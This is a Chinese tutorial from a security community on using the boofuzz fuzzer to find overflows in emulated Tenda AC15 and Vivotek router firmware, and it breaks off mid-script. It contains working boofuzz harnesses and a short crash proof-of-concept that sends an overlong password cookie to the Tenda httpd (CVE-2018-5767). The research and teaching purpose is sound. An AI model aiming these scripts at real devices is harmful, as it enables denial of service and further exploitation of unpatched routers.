---
title: Boofuzz在二进制IOT漏洞挖掘中的简单运用
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562108&idx=1&sn=690de0bb7bffe7752c4e3f3b48a0b5aa&chksm=b18d9eb686fa17a022250b626842ea7937dc14dcb6e226700ec5befcada72ef7d0509427c388&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-07-05
fetch_date: 2025-10-06T17:43:30.229909
---

# Boofuzz在二进制IOT漏洞挖掘中的简单运用

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SFSCeh31iboxLGAEP1JUdic2X2n1ickicKgXkbBe290os9B8ibmywePeCTmw/0?wx_fmt=jpeg)

# Boofuzz在二进制IOT漏洞挖掘中的简单运用

pureGavin

看雪学苑

```
一

正文
```

###

### 环境

Ubuntu 20.04

Python、pip、qemu之类的直接用apt-get下载安装就好。

binwalk里有需要用到sasquatch程序，需要手动下载一下，命令如下：

```
sudo git clone https://github.com/devttys0/sasquatch
cd sasquatch
sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
./build.sh
```

###

### tenda AC15 CVE-2018-5767

####

#### 环境问题

使用binwalk解包以后可以在bin文件夹下看到httpd程序，此时如果直接运行的话会卡在欢迎banner信息处。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SNnBmVmgkcbOvRj1cozsD43Xq7SeXat8jruGz2jEPr6Xs7h1uS59QvA/640?wx_fmt=png&from=appmsg)

需要patch一些代码，修改判断逻辑。

下图中红框内就是已经patch好的代码，点击Edit > Patch program > Apply pathes to input file > OK 即可保存。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SBiaKHpib5zHNgTt3Hh0uFVSkUTaF9UZR2v27jJF07bxbcbs0FpgmDzEw/640?wx_fmt=png&from=appmsg)

修改完成后再次运行依然会报错。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2Sbe8xErklh23iaibHsCPphVccWKTw2beIepOVNibZ5yOdPR9lfq1J2xSqg/640?wx_fmt=png&from=appmsg)

这个错误主要是IP地址不正确，需要查看一下httpd服务具体是怎么获取IP的，需要从check\_network函数开始查，这个函数是引用了第三方的lib库（至少我在Linux源码里没找到这个函数）。

```
find ./lib/ -name "*" | xargs grep 'check_network'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SqFQhmMMOiajXrvpiak5Zeic0VtMmQwiaNjDibVPW8Ij7ZKic9STRkkNymTIw/640?wx_fmt=png&from=appmsg)

结果会找到libcommon.so文件，用IDA打开后可以看到依然是调用了别的so库代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2Sdz75EXx7Ohzj1iayHoIyZQCLBS0tvbf7ibVBficNFxDbibvQs7B6Ric5icTg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SBCDrODk3dicoBD8Kc77W6L3qERldfuJUmorQuPlnYqJfpxFDalZnHvQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SaibR5X0icDRq3AsUvLfWnRXZib9QIrCTe03yKrX5cqTC2bjw6xBuH5LQg/640?wx_fmt=png&from=appmsg)

需要继续搜get\_eth\_name函数位置。

```
find ./lib/ -name "*" | xargs grep 'get_eth_name'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SZTUJiaSUr4D7wUv6fjNTpjP2Ib9oRicmiaD0bAY7Qdx8HknOnyib26zCCA/640?wx_fmt=png&from=appmsg)

有四个匹配，事实上是libChipAPI.so文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SCulBPPibSIexZJ8ogliajw7GP8NhgoAp8Nse9AgVENAJToajyX9Lvlibg/640?wx_fmt=png&from=appmsg)

从代码里可以看到程序在尝试读网卡信息，因为没有对应的网卡，所以程序IP地址会出错，所以这里需要手动创建一个br0网卡，并给一个IP地址（在创建之前建议先保存一个快照以防万一）。

```
sudo tunctl -t br0 -u #用户名#
sudo ifconfig br0 192.168.10.1/24
```

修改好后httpd程序就能正确运行了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SVT2WnYkul4UBIAO74GqVDGnW71RL2NNh2RZe4wrU1SoHX6kDq6YVTA/640?wx_fmt=png&from=appmsg)

####

#### fuzz部分

此处需要抓包查看协议结构，但是因为只是普通的HTTP协议，我就直接给出boofuzz代码了。

```
from boofuzz import *

IP = "10.10.10.1"                #IP地址填自己的IP就好
PORT = 80

def check_response(target, fuzz_data_logger, session, *args, **kwargs):
    fuzz_data_logger.log_info("Checking test case response...")
    try:
        response = target.recv(512)
    except:
        fuzz_data_logger.log_fail("Unable to connect to target. Closing...")
        target.close()
        return

    #if empty response
    if not response:
        fuzz_data_logger.log_fail("Empty response, target may be hung. Closing...")
        target.close()
        return

    #remove everything after null terminator, and convert to string
    #response = response[:response.index(0)].decode('utf-8')
    fuzz_data_logger.log_info("response check...\n" + response.decode())
    target.close()
    return

def main():
    '''
    options = {
        "start_commands": [
            "sudo chroot /home/lys/Documents/IoT/firmware/_AC15_V15.03.1.16.bin.extracted/squashfs-root ./httpd"
        ],
        "stop_commands": ["echo stopping"],
        "proc_name": ["/usr/bin/qemu-arm-static ./httpd"]
    }
    procmon = ProcessMonitor("127.0.0.1", 26002)
    procmon.set_options(**options)
    '''

    session = Session(
        target=Target(
            connection=SocketConnection(IP, PORT, proto="tcp"),
            # monitors=[procmon]
        ),
        post_test_case_callbacks=[check_response],
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        # Line 1
        s_group("Method", ["GET"])
        s_delim(" ", fuzzable=False, name="space-1-1")
        s_string("/goform/123", fuzzable=False)    # fuzzable 1
        s_delim(" ", fuzzable=False, name="space-1-2")
        s_static("HTTP/1.1", name="HTTP_VERSION")
        s_static("\r\n", name="Request-Line-CRLF-1")
        # Line 2
        s_static("Host")
        s_delim(": ", fuzzable=False, name="space-2-1")
        s_string("10.10.10.1", fuzzable=False, name="IP address")
        s_static("\r\n", name="Request-Line-CRLF-2")
        # Line 3
        s_static("Connection")
        s_delim(": ", fuzzable=False, name="space-3-1")
        s_string("keep-alive", fuzzable=False, name="Connection state")
        s_static("\r\n", name="Request-Line-CRLF-3")
        # Line 4
        s_static("Cookie")
        s_delim(": ", fuzzable=False, name="space-4-1")
        s_string("bLanguage", fuzzable=False, name="key-bLanguage")
        s_delim("=", fuzzable=False)
        s_string("en", fuzzable=False, name="value-bLanguage")
        s_delim("; ", fuzzable=False)
        s_string("password", fuzzable=False, name="key-password")
        s_delim("=", fuzzable=False)
        s_string("ce24124987jfjekfjlasfdjmeiruw398r", fuzzable=True)    # fuzzable 2
        s_static("\r\n", name="Request-Line-CRLF-4")
        # over
        s_static("\r\n")
        s_static("\r\n")

    session.connect(s_get("Request"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

在开始之前记得用pip安装一下boofuzz，因为已经知道漏洞点了，所以很快就能跑出结果了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SQ74H3KpeDUu6n6KVsbh3zYgZVohF2Nha9TPd4WqHX7PlDKB1VcMClA/640?wx_fmt=png&from=appmsg)

可以看到在password给出了一个非常长的值后程序崩溃了，验证其实也很简单，直接用Python脚本访问之前给br0的地址，端口是80，cookie中给一个超长的值就能复现崩溃了。

```
import requests

ip = "10.10.10.1"                                #此处修改为自己的IP
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
#print ret.text
```

最后在bLanguage这个字段也有个溢出，大家可以尝试修改上面的fuzz脚本复现一下。

### Vivotek漏洞栈溢出

这是一个2017年爆出的贼老的栈溢出漏洞，不过用来学习boofuzz的使用还是不错的。

#### 环境问题

首先使用binwalk解包固件后会有不少文件，文件系统在这个目录下：

```
_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root
```

http服务用的是boa。

这里有两个点需要修复。

首先将宿主机中/etc/hosts文件夹中的内容全部复制到固件文件系统的/etc/hosts文件中去。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2ShYVOEEvfmb0gcq7pI2SjNoD2BLwFMUsksfcHicorRkFL1ib5WzgntSlA/640?wx_fmt=png&from=appmsg)

然后将 \_31.extracted/defconf/\_CC8160.tar.bz2.extracted/\_0.extracted/etc/ 目录直接拷贝到 squashfs-root/mnt/flash/ 目录中去，这一步主要是解决boa的config文件缺失问题。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2SOYzgwPKl8xsA8uuckZ5QW41gN75T5Uo3NNCRmKve4clZhVibb4ayA8Q/640?wx_fmt=png&from=appmsg)

接下来直接用qemu命令运行httpd服务就行了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FeKI2dpuEZmzElBSWjbK2Su7ia5vutTqyNDt8PibluwPhLnZgeVTP4bgAnZM0fOibUsf0TRwUocR2Zg/640?wx_fmt=png&from=appmsg)

####

#### fuzz部分

fuzz这个洞的脚本如下：

```
from boofuzz import *

IP = "127.0.0.1"
PORT = 80

def check_response(target, fuzz_data_logger, session, *args, **kwargs):
    fuzz_data_logger.log_info("Checking test case response...")
    try:
        response = target.recv(512)
    except:
        fuzz_data_logger.log_fail("Unable to connect to target. Closing...")
        target.close()
        return

    #if empty response
    if not response:
        fuzz_data_logger.log_fail("Empty response, target may be hung. Closing...")
        target.close()
        return

    #remove everything after null terminator, and convert to string
    #response = response[:response.index(0)].decode('utf-...